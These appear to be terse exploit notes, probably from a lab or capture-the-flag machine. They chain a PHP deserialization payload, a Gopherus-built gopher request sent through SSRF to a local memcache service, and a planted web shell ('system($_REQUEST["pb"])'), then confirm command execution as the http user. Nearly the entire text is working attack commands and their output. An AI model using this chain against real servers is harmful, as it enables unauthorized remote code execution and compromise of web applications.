$ php payload.php
O:6:"Logger":2:{s:12:"Loggerfile";s:6:"pb.php";s:12:"Loggerdata";s:30:"<?php system($_REQUEST["pb"]);";}


gopherus --exploit phpmemcache 
put the payload above in this to create a gopher payload
now replace Spyder with 127.0.0.1 to make sure it works for us via ssrf

curl "gopher://127.0.0.1:11211/_%0d%0aset%20127.0.0.1%204%200%20104%0d%0aO:6:%22Logger%22:2:%7Bs:12:%22Loggerfile%22%3Bs:6:%22pb.php%22%3Bs:12:%22Loggerdata%22%3Bs:30:%22%3C%3Fphp%20system%28%24_REQUEST%5B%22pb%22%5D%29%3B%22%3B%7D%0d%0a"
ERROR
STORED
ERROR


$ curl 127.0.0.1/testapp/logs/pb.php?pb=id
uid=33(http) gid=33(http) groups=33(http)
